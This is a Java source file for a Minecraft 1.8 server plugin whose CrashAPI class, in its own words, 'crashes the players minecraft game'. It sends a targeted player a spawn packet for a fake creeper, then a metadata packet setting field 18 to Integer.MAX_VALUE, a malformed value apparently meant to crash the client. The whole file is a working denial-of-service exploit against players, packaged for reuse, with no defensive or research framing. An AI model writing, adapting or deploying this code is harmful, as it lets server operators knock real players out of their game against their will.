package me.falconseeker.crashbug;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_8_R3.DataWatcher;
import net.minecraft.server.v1_8_R3.EntityCreeper;
import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntityLiving;

public class CrashAPI {
	
	private CrashBug main;
	
	public CrashAPI(CrashBug main) {
		this.main = main;
	}
	
	/**
	 * Crashes the players minecraft game
	 * 
	 * @param willBeCrashed
	 * Player to crash
	 */
	public void crashPlayer(Player willBeCrashed){
        final EntityPlayer px = ((CraftPlayer)willBeCrashed).getHandle();
        final EntityCreeper entity = new EntityCreeper(px.world);

        final  DataWatcher dw = new DataWatcher(entity);
        dw.a(18, (Object)Integer.MAX_VALUE);

        PacketPlayOutSpawnEntityLiving packet_spawn = new PacketPlayOutSpawnEntityLiving(entity);

        px.playerConnection.sendPacket(packet_spawn);
        Bukkit.getScheduler().scheduleSyncDelayedTask(main, new Runnable(){ 
            @Override
            public void run() {
                PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
                px.playerConnection.sendPacket(meta);
            }

        }, 5L);
    }
}
